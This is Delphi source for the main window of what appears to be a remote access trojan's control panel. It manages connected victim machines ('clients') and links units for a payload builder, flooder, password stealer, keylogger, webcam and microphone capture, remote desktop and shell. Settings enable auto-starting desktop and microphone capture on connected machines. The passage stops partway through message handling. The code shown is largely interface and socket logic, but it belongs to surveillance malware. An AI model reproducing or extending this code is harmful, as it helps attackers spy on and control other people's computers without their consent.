unit UnitMain;
        
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, ComCtrls, XPMan, ToolWin, acPNG, ExtCtrls, acImage, jpeg,
  StdCtrls, Spin, uJSONConfig, ExtCtrlsX, ShellAPI, UnitVariables, SocketUnitEx,
  ImgList, MMSystem, BTMemoryModule, WinSock, VirtualTrees, UnitEncryption,
  WinSkinData, WinSkinStore, TeEngine, Series, TeeProcs, Chart, System.ImageList;

type
  TFormMain = class(TForm)
    xpmnfst1: TXPManifest;                                             
    tlb1: TToolBar;
    btn2: TToolButton;
    btn3: TToolButton;
    btn4: TToolButton;
    btn6: TToolButton;
    btn7: TToolButton;
    pnlClients: TPanel;
    pnlLogs: TPanel;
    lvLogs: TListView;
    trycn1: TTrayIcon;
    pm4: TPopupMenu;
    R6: TMenuItem;
    E2: TMenuItem;
    ilThumbs: TImageList;
    ilFlags: TImageList;
    pm1: TPopupMenu;
    C1: TMenuItem;
    R5: TMenuItem;
    R4: TMenuItem;
    R3: TMenuItem;
    C2: TMenuItem;
    U2: TMenuItem;
    F8: TMenuItem;
    F9: TMenuItem;
    F10: TMenuItem;
    U4: TMenuItem;
    U3: TMenuItem;
    N1: TMenuItem;
    dlgOpen1: TOpenDialog;
    C5: TMenuItem;
    btn10: TToolButton;
    C6: TMenuItem;
    pm5: TPopupMenu;
    C3: TMenuItem;
    P1: TMenuItem;
    T1: TMenuItem;
    btn13: TToolButton;
    pnlMap: TPanel;
    img2: TImage;
    pnl1: TPanel;
    lbl7: TLabel;
    lbl10: TLabel;
    lbl11: TLabel;
    lbl12: TLabel;
    lbl13: TLabel;
    tmr1: TTimer;
    N2: TMenuItem;
    A1: TMenuItem;
    S1: TMenuItem;
    D3: TMenuItem;
    N3: TMenuItem;
    M1: TMenuItem;
    D4: TMenuItem;
    W2: TMenuItem;
    P2: TMenuItem;
    tmr2: TTimer;
    btn8: TToolButton;
    pnlDB: TPanel;
    pm6: TPopupMenu;
    E1: TMenuItem;
    C7: TMenuItem;
    N4: TMenuItem;
    R1: TMenuItem;
    pm7: TPopupMenu;
    L1: TMenuItem;
    C8: TMenuItem;
    C9: TMenuItem;
    N5: TMenuItem;
    N6: TMenuItem;
    L2: TMenuItem;
    btn11: TToolButton;
    I1: TMenuItem;
    pm9: TPopupMenu;
    S2: TMenuItem;
    U1: TMenuItem;
    D5: TMenuItem;
    R7: TMenuItem;
    U5: TMenuItem;
    N7: TMenuItem;
    C10: TMenuItem;
    I2: TMenuItem;
    R8: TMenuItem;
    il3: TImageList;
    pm2: TPopupMenu;
    MenuItem1: TMenuItem;
    pnlPlugins: TPanel;
    lvPlugins: TListView;
    U6: TMenuItem;
    il1: TImageList;
    T2: TMenuItem;
    tmr3: TTimer;
    pnlStats: TPanel;
    btn12: TToolButton;
    pgc1: TPageControl;
    ts1: TTabSheet;
    ts2: TTabSheet;
    lbl2: TLabel;
    lv2: TListView;
    lv3: TListView;
    rb1: TRadioButton;
    rb2: TRadioButton;
    tmr4: TTimer;
    lbl6: TLabel;
    lv4: TListView;
    lv5: TListView;
    rb3: TRadioButton;
    rb4: TRadioButton;
    lbl8: TLabel;
    lbl14: TLabel;
    pm8: TPopupMenu;
    S6: TMenuItem;
    L3: TMenuItem;
    btn1: TToolButton;
    M2: TMenuItem;
    R2: TMenuItem;
    N8: TMenuItem;
    procedure FormShow(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure btn6Click(Sender: TObject);
    procedure btn7Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure R6Click(Sender: TObject);
    procedure E2Click(Sender: TObject);
    procedure vrtlstrngtr1DblClick(Sender: TObject);
    procedure vrtlstrngtr1GetImageIndex(Sender: TBaseVirtualTree;
      Node: PVirtualNode; Kind: TVTImageKind; Column: TColumnIndex;
      var Ghosted: Boolean; var ImageIndex: Integer);
    procedure vrtlstrngtr1InitNode(Sender: TBaseVirtualTree; ParentNode,
      Node: PVirtualNode; var InitialStates: TVirtualNodeInitStates);
    procedure vrtlstrngtr1MeasureItem(Sender: TBaseVirtualTree;
      TargetCanvas: TCanvas; Node: PVirtualNode; var NodeHeight: Integer);
    procedure vrtlstrngtr1GetText(Sender: TBaseVirtualTree;
      Node: PVirtualNode; Column: TColumnIndex; TextType: TVSTTextType;
      var CellText: WideString);
    procedure R5Click(Sender: TObject);
    procedure R4Click(Sender: TObject);
    procedure C5Click(Sender: TObject);
    procedure R3Click(Sender: TObject);
    procedure C2Click(Sender: TObject);
    procedure F8Click(Sender: TObject);
    procedure F9Click(Sender: TObject);
    procedure F10Click(Sender: TObject);
    procedure U4Click(Sender: TObject);
    procedure U3Click(Sender: TObject);
    procedure lvLogsCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure btn10Click(Sender: TObject);
    procedure vrtlstrngtr1GetNodeDataSize(Sender: TBaseVirtualTree;
      var NodeDataSize: Integer);
    procedure vrtlstrngtr1GetPopupMenu(Sender: TBaseVirtualTree;
      Node: PVirtualNode; Column: TColumnIndex; const P: TPoint;
      var AskParent: Boolean; var PopupMenu: TPopupMenu);
    procedure C6Click(Sender: TObject);
    procedure vrtlstrngtr1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure C3Click(Sender: TObject);
    procedure P1Click(Sender: TObject);
    procedure T1Click(Sender: TObject);
    procedure trycn1DblClick(Sender: TObject);
    procedure btn13Click(Sender: TObject);
    procedure img2MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure img2MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure tmr1Timer(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure D3Click(Sender: TObject);
    procedure D4Click(Sender: TObject);
    procedure W2Click(Sender: TObject);
    procedure P2Click(Sender: TObject);
    procedure tmr2Timer(Sender: TObject);
    procedure vrtlstrngtr1HeaderClick(Sender: TVTHeader;
      HitInfo: TVTHeaderHitInfo);
    procedure vrtlstrngtr1CompareNodes(Sender: TBaseVirtualTree; Node1,
      Node2: PVirtualNode; Column: TColumnIndex; var Result: Integer);
    procedure vrtlstrngtr2CompareNodes(Sender: TBaseVirtualTree; Node1,
      Node2: PVirtualNode; Column: TColumnIndex; var Result: Integer);
    procedure vrtlstrngtr2ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure vrtlstrngtr2GetImageIndex(Sender: TBaseVirtualTree;
      Node: PVirtualNode; Kind: TVTImageKind; Column: TColumnIndex;
      var Ghosted: Boolean; var ImageIndex: Integer);
    procedure vrtlstrngtr2GetNodeDataSize(Sender: TBaseVirtualTree;
      var NodeDataSize: Integer);
    procedure vrtlstrngtr2GetPopupMenu(Sender: TBaseVirtualTree;
      Node: PVirtualNode; Column: TColumnIndex; const P: TPoint;
      var AskParent: Boolean; var PopupMenu: TPopupMenu);
    procedure vrtlstrngtr2GetText(Sender: TBaseVirtualTree;
      Node: PVirtualNode; Column: TColumnIndex; TextType: TVSTTextType;
      var CellText: WideString);
    procedure vrtlstrngtr2HeaderClick(Sender: TVTHeader;
      HitInfo: TVTHeaderHitInfo);
    procedure vrtlstrngtr2InitNode(Sender: TBaseVirtualTree; ParentNode,
      Node: PVirtualNode; var InitialStates: TVirtualNodeInitStates);
    procedure vrtlstrngtr2MeasureItem(Sender: TBaseVirtualTree;
      TargetCanvas: TCanvas; Node: PVirtualNode; var NodeHeight: Integer);
    procedure E1Click(Sender: TObject);
    procedure C7Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure L1Click(Sender: TObject);
    procedure C8Click(Sender: TObject);
    procedure C9Click(Sender: TObject);
    procedure L2Click(Sender: TObject);
    procedure btn11Click(Sender: TObject);
    procedure vrtlstrngtr1PaintText(Sender: TBaseVirtualTree;
      const TargetCanvas: TCanvas; Node: PVirtualNode;
      Column: TColumnIndex; TextType: TVSTTextType);
    procedure btn8Click(Sender: TObject);
    procedure I1Click(Sender: TObject);
    procedure S2Click(Sender: TObject);
    procedure U1Click(Sender: TObject);
    procedure D5Click(Sender: TObject);
    procedure R7Click(Sender: TObject);
    procedure U5Click(Sender: TObject);
    procedure C10Click(Sender: TObject);
    procedure I2Click(Sender: TObject);
    procedure R8Click(Sender: TObject);
    procedure MenuItem1Click(Sender: TObject);
    procedure U6Click(Sender: TObject);
    procedure lvPluginsContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure T2Click(Sender: TObject);
    procedure tmr3Timer(Sender: TObject);
    procedure btn12Click(Sender: TObject);
    procedure rb1Click(Sender: TObject);
    procedure rb2Click(Sender: TObject);
    procedure tmr4Timer(Sender: TObject);
    procedure rb4Click(Sender: TObject);
    procedure rb3Click(Sender: TObject);
    procedure lbl14Click(Sender: TObject);
    procedure S6Click(Sender: TObject);
    procedure L3Click(Sender: TObject);
    procedure M2Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
  private
    { Private declarations }
    ThumbsList: TImageList;
    procedure CountClients;
    function RetrieveLogs: string;
    procedure OnMinimizeToTray(Sender: TObject);
    procedure ShowBalloonInfos;
    function GetNodeGroup(ClientDatas: TClientDatas): PVirtualNode;
    function PlotLocations(Lat, Long: Double): TPoint;
    procedure SaveLogsDatas;
    procedure SavePluginsInfos;
  public
    { Public declarations }    
    ImagesList: TImageList;
    procedure AddLog(Log: string; i: Integer = -1; lColor: TColor = clBlack);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormMain: TFormMain;

implementation

uses
  UnitBuilder, UnitDesktop, UnitFilesManager, UnitFlooder, UnitFun, UnitDnsUpdater,
  UnitInformations, UnitLogger, UnitMessagesBox, UnitMicrophone, UnitPasswords,
  UnitPortScanner, UnitPortSniffer, UnitRegistryManager, UnitScripts, UnitShell,
  UnitTasksManager, UnitWebcam, UnitChat, UnitEditFile, GeoIP, UnitSelectPort,
  UnitConstants, UnitCommands, UnitFunctions, UnitNotification, UnitCountry,
  UnitRepository, UnitFtpManager, UnitManager, UnitAbout, UnitRecords,
  UnitPluginsBuilder, UnitClientEdit, UnitMultiDesktop, UnitDB, UnitMultiWebcam,
  UnitSystem, UnitNotes, UnitPluginsManager, UnitClientsTasks, UnitSettings;

{$R *.dfm}

type
  TMyThumbList = class
    Thumb: Integer;
  end;

procedure TFormMain.FormShow(Sender: TObject);
var
  TmpRes: TResourceStream;
  TmpStr, TmpStr1, TmpStr2: string;
  TmpList: TStringArray;
  TmpItem: TListItem;
  i, j: Integer;
begin
  Caption := PROGRAMINFOS;
  pnlClients.BringToFront;
  StartTime := GetTickCount;

  PluginsPath := ExtractFilePath(ParamStr(0)) + 'Plugins';
  if not DirectoryExists(PluginsPath) then CreateDir(PluginsPath);
  
  if not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Database') then
    CreateDir(ExtractFilePath(ParamStr(0)) + 'Database');
                                        
  if not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Resources') then
    CreateDir(ExtractFilePath(ParamStr(0)) + 'Resources');

  DBFile := ExtractFilePath(ParamStr(0)) + 'Database\DB.clients';
  DBStatsFile := ExtractFilePath(ParamStr(0)) + 'Database\DB.server';
  GeoIpFile := ExtractFilePath(ParamStr(0)) + 'Resources\geoip\GeoIP.dat';

  skndt1.EnableSkin(False);

  if SkinForm = True then
  begin
    skndt1.EnableSkin(True);
    skndt1.LoadFromCollection(sknstr1, SkinId);
    skndt1.Active := True;
  end;

  if FormSelectPort.lv1.Items.Count = 0 then
  begin
    while ActivePortList <> '' do
    begin
      Application.ProcessMessages;
      TmpStr := Copy(ActivePortList, 1, Pos('|', ActivePortList) - 1);
      TmpStr1 := Copy(TmpStr, 1, Pos(' ', TmpStr) - 1);
      TmpStr2 := Copy(TmpStr, Pos(':', TmpStr) + 2, Pos(')', TmpStr) - 1);

      if TmpStr2 = 'No)' then
      begin
        if StartupListening = True then
          FormSelectPort.AddPort(StrToInt(TmpStr1), True, False)
        else FormSelectPort.AddPort(StrToInt(TmpStr1), False, False);
      end
      else
      begin
        if StartupListening = True then
          FormSelectPort.AddPort(StrToInt(TmpStr1), True, True)
        else FormSelectPort.AddPort(StrToInt(TmpStr1), False, True);
      end;

      Delete(ActivePortList, 1, Pos('|', ActivePortList));
    end;
  end;

  tmr1.Enabled := True;             
  tmr2.Enabled := True;
  tmr3.Enabled := True;
  tmr4.Enabled := True;

  TmpStr1 := ExtractFilePath(ParamStr(0)) + 'Settings\Plugins.settings';
  if not FileExists(TmpStr1) then Exit;

  TmpStr := FileToStr(TmpStr1);
  if TmpStr = '' then Exit;
  TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
  i := StringCount('|', TmpStr);
  TmpList := ParseString('|', TmpStr);
  
  for j := 0 to i - 1 do
  begin
    Application.ProcessMessages;

    TmpStr := TmpList[j];
    TmpStr1 := Copy(TmpStr, 1, Pos('?', TmpStr) - 1);
    Delete(TmpStr, 1, Pos('?', TmpStr));

    TmpItem := FormPluginsManager.lv1.Items.Add;
    TmpItem.Caption := TmpStr1;
    TmpItem.SubItems.Add(TmpStr);
  end;                                      
  
  FormClientsTasks.LoadPendingTasks;
end;

procedure TFormMain.btn2Click(Sender: TObject);
begin
  pnlClients.BringToFront;
end;

procedure TFormMain.btn6Click(Sender: TObject);
begin
  pnlLogs.BringToFront;
end;
          
procedure TFormMain.T1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin
  T1.Checked := not T1.Checked;

  if T1.Checked then
  begin
    pnlClients.BringToFront;

    vrtlstrngtr1.Header.Columns[0].Width := ThumbWidth + 110;
    vrtlstrngtr1.Refresh;
    
    ilThumbs.Clear;
    ilThumbs.Width := ThumbWidth;
    ilThumbs.Height := ThumbHeight;
    vrtlstrngtr1.Images := ilThumbs;

    for i := 0 to ClientsList.Count - 1 do
    begin
      Application.ProcessMessages;
      ClientDatas := TClientDatas(ClientsList[i]);
      if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
      ClientDatas.DeskImage := -1;
      vrtlstrngtr1.ReinitNode(ClientDatas.Node, False);
      ClientDatas.SendDatas(DESKTOPTHUMBNAILVIEW + '|' + IntToStr(ThumbWidth) + '|' + IntToStr(ThumbHeight));
    end;
  end
  else
  begin
    vrtlstrngtr1.Images := ilFlags;
    vrtlstrngtr1.Header.Columns[0].Width := 150;
    vrtlstrngtr1.Refresh;

    for i := 0 to ClientsList.Count - 1 do
    begin
      Application.ProcessMessages;
      ClientDatas := TClientDatas(ClientsList[i]);
      if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
      vrtlstrngtr1.ReinitNode(ClientDatas.Node, False);
    end;
  end;
end;

procedure TFormMain.btn7Click(Sender: TObject);
begin
  FormAbout.ShowModal;
end;

procedure TFormMain.FormClose(Sender: TObject; var Action: TCloseAction);
var
  JSONConfig: TJSONConfig;
  ClientDatas: TClientDatas;
  TmpStr, TmpStr1: string;
  i: Integer;
begin
  tmr1.Enabled := False;
  tmr2.Enabled := False;
  tmr3.Enabled := False;
  tmr4.Enabled := False;
  
  if ClientsList.Count <> 0 then
  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.OnDisconnectIdle := DateTimeToStr(Now);
    ClientDatas.EndTime := GetTickCount;
    SaveDBDatas(ClientDatas.SaveGlobalDatas);
  end;

  ClientsList.Free;
  MyBmp.Free;
  SaveDBFile;                          
  SaveDBStatsFile;
  SaveLogsDatas;
  SavePluginsInfos;
  FormClientsTasks.SavePendingTasks;

  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.WriteInteger('Main width', Width);
  JSONConfig.WriteInteger('Main height', Height);
  JSONConfig.WriteInteger('Main left', Left);
  JSONConfig.WriteInteger('Main top', Top);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
  
  ExitProcess(0);
end;

procedure TFormMain.FormCreate(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  SHFileInfo: TSHFileInfo;
  i: Integer;
begin
  if not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Settings') then
    CreateDir(ExtractFilePath(ParamStr(0)) + 'Settings');

  SettingsFile := ExtractFilePath(ParamStr(0)) + 'Settings\Server.settings';
  PortsSettings := ExtractFilePath(ParamStr(0)) + 'Settings\Ports.settings';
  DNSSettings := ExtractFilePath(ParamStr(0)) + 'Settings\DNS.settings';
  FTPSettings := ExtractFilePath(ParamStr(0)) + 'Settings\FTP.settings';
  WindowsSettings := ExtractFilePath(ParamStr(0)) + 'Settings\Windows.settings';

  //Load window position settings
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  i := JSONConfig.ReadInteger('Main width');
  if i <= 0 then Width := 768 else Width := i;
  i := JSONConfig.ReadInteger('Main height');
  if i <= 0 then Height := 389 else Height := i;
  i := JSONConfig.ReadInteger('Main left');
  if i <= 0 then Left := (Screen.Width - Width) div 2 else Left := i;
  i := JSONConfig.ReadInteger('Main top');
  if i <= 0 then Top := (Screen.Height - Height) div 2 else Top := i;
  JSONConfig.Free;

  //Load main settings
  JSONConfig := TJSONConfig.Create(SettingsFile, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  StartupListening := JSONConfig.ReadBool('Startup listening');
  GeoIpLocalisation := JSONConfig.ReadBool('GeoIp localisation');
  SoundNotification := JSONConfig.ReadBool('Sound notification');
  VisualNotification := JSONConfig.ReadBool('Visual notification');
  MinimizeToTray := JSONConfig.ReadBool('Minimize to system tray');
  CloseToTray := JSONConfig.ReadBool('Close to system tray');
  SaveLogs := JSONConfig.ReadBool('Save events logs');
  UpdateInfos := JSONConfig.ReadBool('Update infos');
  KeepAlive := JSONConfig.ReadBool('Keep alive');
  ThumbWidth := JSONConfig.ReadInteger('Thumbnail width');
  ThumbHeight := JSONConfig.ReadInteger('Thumbnail height');
  TimeOut := JSONConfig.ReadInteger('Keep alive timeout');
  AutostartDesk := JSONConfig.ReadBool('Autostart desktop capture');
  AutostartMic := JSONConfig.ReadBool('Autostart microphone capture');
  SkinForm := JSONConfig.ReadBool('Enable skin');
  SkinId := JSONConfig.ReadInteger('Skin id');
  JSONConfig.Free;

  //Load listening ports settings
  JSONConfig := TJSONConfig.Create(PortsSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  ActivePortList := JSONConfig.ReadString('Active ports list');
  ConnectionPassword := JSONConfig.ReadString('Connection password');
  MaxConnections := JSONConfig.ReadInteger('Max connections');
  JSONConfig.Free;

  //Load dns updater settings
  JSONConfig := TJSONConfig.Create(DNSSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  DNSHost := JSONConfig.ReadString('DNS host');
  DNSUser := JSONConfig.ReadString('DNS user');
  DNSPassword := JSONConfig.ReadString('DNS pass');
  DNSProvider := JSONConfig.ReadInteger('DNS provider');
  JSONConfig.Free;

  //Load FTP settings
  JSONConfig := TJSONConfig.Create(FTPSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  FtpHost := JSONConfig.ReadString('Ftp host');
  FtpUser := JSONConfig.ReadString('Ftp user');
  FtpPass := JSONConfig.ReadString('Ftp pass');
  FtpDir := JSONConfig.ReadString('Ftp directory');
  FtpPort := JSONConfig.ReadInteger('Ftp port');
  JSONConfig.Free;

  Application.OnMinimize := OnMinimizeToTray;

  ClientsList := TList.Create;  
  DBDatasList := TStringList.Create;

  FileIconInit(True);
  ImagesList := TImageList.CreateSize(16, 16);
  ImagesList.ShareImages := True;
  ImagesList.Handle := SHGetFileInfo('', FILE_ATTRIBUTE_NORMAL, SHFileInfo,
    SizeOf(SHFileInfo), SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES or SHGFI_SYSICONINDEX);

  ThumbsList := TImageList.CreateSize(150, 80);
end;

procedure TFormMain.ShowBalloonInfos;
begin
  FormMain.Hide;
  trycn1.BalloonFlags := bfInfo;
  trycn1.BalloonTitle := PROGRAMINFOS;
  trycn1.BalloonHint := 'Total connected: ' + IntToStr(ClientsList.Count);
  trycn1.ShowBalloonHint;
end;                                

procedure TFormMain.OnMinimizeToTray(Sender: TObject);
begin
  if MinimizeToTray then ShowBalloonInfos;
end;

procedure TFormMain.CountClients;
begin
  if ClientsList.Count = 0 then btn2.Caption := 'Clients' else
    btn2.Caption := 'Clients (' + IntToStr(ClientsList.Count) + ')';
end;

procedure TFormMain.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  CanClose := not CloseToTray;
  if CanClose = False then ShowBalloonInfos;
end;

procedure TFormMain.R6Click(Sender: TObject);
begin
  trycn1DblClick(Sender);
end;

procedure TFormMain.trycn1DblClick(Sender: TObject);
begin
  FormMain.Show;
end;

procedure TFormMain.E2Click(Sender: TObject);
begin
  OnCloseQuery := nil;
  Close;
end;

function TFormMain.GetNodeGroup(ClientDatas: TClientDatas): PVirtualNode;
var
  TmpNode: PVirtualNode;
  ClientDatasNew: TClientDatas;
begin
  Result := nil;
  TmpNode := vrtlstrngtr1.GetFirst;

  while Assigned(TmpNode) do
  begin
    if (PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode))^.Infos.GroupId = ClientDatas.Infos.GroupId) and
      (vrtlstrngtr1.GetNodeLevel(TmpNode) = 0)
    then
    begin
      PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode))^.Infos.GroupIcon := ClientDatas.Infos.GroupIcon;
      Result := TmpNode;
      Break;
    end
    else TmpNode := vrtlstrngtr1.GetNext(TmpNode);
  end;

  if Result = nil then
  begin
    ClientDatasNew := TClientDatas.Create;
    ClientDatasNew.Infos.GroupId := ClientDatas.Infos.GroupId;
    ClientDatasNew.Infos.GroupIcon := ClientDatas.Infos.GroupIcon;
    Result := vrtlstrngtr1.AddChild(nil, ClientDatasNew);
    vrtlstrngtr1.Expanded[Result] := True;
    vrtlstrngtr1.Refresh;
  end;
end;

function GetClientDatas(Id: string): TClientDatas;
var
  i: Integer;
begin
  Result := nil;
  for i := 0 to ClientsList.Count - 1 do
  begin
    if TClientDatas(ClientsList[i]).Id = Id then
    begin
      Result := TClientDatas(ClientsList[i]);
      Break;
    end;
  end;
end;

procedure TFormMain.WndProc(var Msg: TMessage);
var
  ClientManager: TClientManager;
  ClientDatas: TClientDatas;
  ClientSocket: TClientSocket;
  Stream: TMemoryStream;
  MainCommand, Datas,
  TmpStr, TmpStr1: string;
  TmpItem: TListItem;
  InfosList: TStringArray;
  TmpRes: TResourceStream;
  TmpHandle: THandle;
  Jpg: TJPEGImage;
  Bmp: TBitmap;
  i: Integer;
  TmpForm: TFormNotification;
  r: TRect;
  TmpNode, TmpNode1: PVirtualNode;
  JSONConfig: TJSONConfig;
  LogDatas: TLogDatas;
begin
  inherited;
  
  if Msg.Msg = WM_REMOVE_CLIENT then
  begin
    ClientManager := PClientManager(Msg.WParam)^;
    ClientSocket := ClientManager.ClientSocket;
    if ClientSocket = nil then Exit;
    ClientDatas := TClientDatas(ClientSocket.Data);
    
    if ClientDatas <> nil then 
    begin
      AddLog('Client ' + ClientDatas.UserId + ' disconnected from socket ' +
        IntToStr(ClientDatas.ClientSocket.Socket), ClientDatas.ImageIndex, clRed);
                                    
      if VisualNotification = True then
      begin
        SendMessage(Handle, WM_POPUP_DISCONNECTION,
          Integer('Client disconnected|' + ClientDatas.WanIp + ' / ' +
          ClientDatas.Infos.LocalPort + '|' + ClientDatas.Countryname + '|' +
          ClientDatas.Infos.User + '|' + ClientDatas.Infos.Windows + '|' +
          IntToStr(ClientDatas.ImageIndex) + '|'), 0);
        Application.ProcessMessages;
      end;

      TmpNode := ClientDatas.Node;

      if TmpNode <> nil then
      begin                                      
        TmpNode1 := TmpNode.Parent;

        vrtlstrngtr1.DeleteNode(TmpNode);
        if TmpNode1.ChildCount <= 0 then vrtlstrngtr1.isVisible[TmpNode1] := False;
        vrtlstrngtr1.Refresh;
      end;

      ClientDatas.OnDisconnectIdle := DateTimeToStr(Now);
      ClientDatas.EndTime := GetTickCount;
      SaveDBDatas(ClientDatas.SaveGlobalDatas);
      ClientsList.Remove(ClientDatas);
      CountClients;

      if ClientDatas.Forms[5] <> nil then  TFormDesktop(ClientDatas.Forms[5]).Close;
      if ClientDatas.Forms[6] <> nil then  TFormWebcam(ClientDatas.Forms[6]).Close;
      if ClientDatas.Forms[16] <> nil then  TFormManager(ClientDatas.Forms[16]).Close;

      ClientDatas.Free;
      ClientDatas := nil;
      ClientSocket.Data := nil;

      if SoundNotification = True then
      PlaySound(PChar(3), hInstance, SND_ASYNC or SND_MEMORY or SND_RESOURCE);
    end;

    ClientSocket.Disconnect;
    ClientSocket.Free;
    ClientSocket := nil;
  end
  else

  if Msg.Msg = WM_POPUP_CONNECTION then
  begin            
    TmpStr := string(Msg.WParam);
    TmpForm := TFormNotification.Create(Self, TmpStr);
    SystemParametersInfo(SPI_GETWORKAREA, 0, @r, 0);
    TmpForm.Left := r.Right - TmpForm.Width - 3;
    TmpForm.Top := r.Bottom;
    TmpForm.PosY := TmpForm.Top - TmpForm.Height;
    TmpForm.Active := True;
    TmpForm.Show;
    TmpForm.tmr1.Enabled := True;
  end
  else
     
  if Msg.Msg = WM_POPUP_DISCONNECTION then
  begin
    TmpStr := string(Msg.WParam);
    TmpForm := TFormNotification.Create(Self, TmpStr);
    SystemParametersInfo(SPI_GETWORKAREA, 0, @r, 0);
    TmpForm.Left := r.Right - (TmpForm.Width * 2) - 8;
    TmpForm.Top := r.Bottom;
    TmpForm.PosY := TmpForm.Top - TmpForm.Height;
    TmpForm.Active := True;     
    TmpForm.img1.Grayed := True;
    TmpForm.Show;
    TmpForm.tmr1.Enabled := True;
  end
  else

  if Msg.Msg = WM_TRANSFER_OK then
  begin
    TmpStr := string(Msg.WParam);
    TmpStr1 := Copy(TmpStr, 1, Pos('|', TmpStr) - 1);
    Delete(TmpStr, 1, Pos('|', TmpStr));

    trycn1.BalloonFlags := bfInfo;
    trycn1.BalloonTitle := TmpStr1;
    trycn1.BalloonHint := TmpStr;
    trycn1.ShowBalloonHint;
  end
  else
       
  if Msg.Msg = WM_TRANSFER_ERROR then
  begin
    TmpStr := string(Msg.WParam);
    TmpStr1 := Copy(TmpStr, 1, Pos('|', TmpStr) - 1);
    Delete(TmpStr, 1, Pos('|', TmpStr));

    trycn1.BalloonFlags := bfError;
    trycn1.BalloonTitle := TmpStr1;
    trycn1.BalloonHint := TmpStr;
    trycn1.ShowBalloonHint;
  end
  else

  if Msg.Msg = WM_ADD_EVENTLOG then
  begin
    LogDatas := PLogDatas(Msg.WParam)^;

    TmpItem := lvLogs.Items.Add;
    TmpItem.Caption := DateTimeToStr(Now);
    TmpItem.SubItems.Add(LogDatas.Log);
    TmpItem.ImageIndex := LogDatas.i;
    TmpItem.Data := TObject(LogDatas.lColor);
    SendMessage(lvLogs.Handle, WM_VSCROLL, SB_LINEDOWN, 0);
    btn6.Caption := 'Events log (' + IntToStr(lvLogs.Items.Count) + ')';
    Application.ProcessMessages;
  end
  else

  if Msg.Msg = WM_PROCESS_DATAS then
  begin  
    ClientManager := PClientManager(Msg.WParam)^;
    ClientSocket := ClientManager.ClientSocket;
    Datas := ClientManager.Datas;
    
    MainCommand := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if MainCommand = CLIENTNEW then
    begin
      if Datas <> ConnectionPassword then
      begin                     
        AddLog('Connection refused from socket ' + IntToStr(ClientSocket.Socket) +
          ', wrong password ' + Datas, -1, clRed);
        ClientSocket.Disconnect;
        ClientSocket.Free;
        ClientSocket := nil;
      end
      else
      begin
        ClientDatas := TClientDatas.Create;  
        ClientDatas.ClientSocket := ClientSocket;
        ClientDatas.UserId := '';    
        ClientDatas.PingCaption := '';
        ClientDatas.Id := 'CltID_' + RandomString;
        ClientDatas.OnConnectIdle := DateTimeToStr(Now);
        ClientDatas.OnDisconnectIdle := '';
        ClientDatas.Ping := GetTickCount;
        ClientDatas.PingColor := clBlack;
        ClientDatas.StartTime := GetTickCount;
        ClientDatas.EndTime := 0;
        ClientDatas.TimeOutCount := 0;
        ClientDatas.ImageIndex := -1;     
        ClientDatas.PingImage := -1;
        ClientDatas.DeskImage := -1;
        ClientDatas.PositionX := -1;
        ClientDatas.PositionY := -1;
        ClientDatas.PingReceived := True;
        ClientDatas.Node := nil;
        for i := 0 to High(ClientDatas.Forms) - 1 do ClientDatas.Forms[i] := nil;
        ClientSocket.Data := ClientDatas;

        ClientDatas.SendDatas(INFOSMAIN + '|' + ClientDatas.Id);
      end;
    end
    else

    if MainCommand = INFOSMAIN then
    begin         
      ClientDatas := TClientDatas(ClientSocket.Data);       
      if ClientDatas = nil then Exit;

      if ClientsList.Count = MaxConnections then
      begin
        ClientDatas.SendDatas(CLIENTCLOSE + '|');
        Exit;
      end;

      InfosList := ParseString('$', Datas);
      ClientDatas.InitInfos(InfosList);

      ClientDatas.UserId := ClientDatas.Infos.ClientId + '^(' +
        ClientDatas.Infos.User + '@' + ClientDatas.Infos.Computer + ')';
      ClientDatas.CountryName := ClientDatas.Infos.CountryCode + ' (' + GetCountryName(ClientDatas.Infos.CountryCode) + ')';
      ClientDatas.WanIp := ClientDatas.ClientSocket.RemoteAddress;
      if ClientDatas.Infos.WebCam = 'Installed' then ClientDatas.CamImage := 265 else ClientDatas.CamImage := 264;
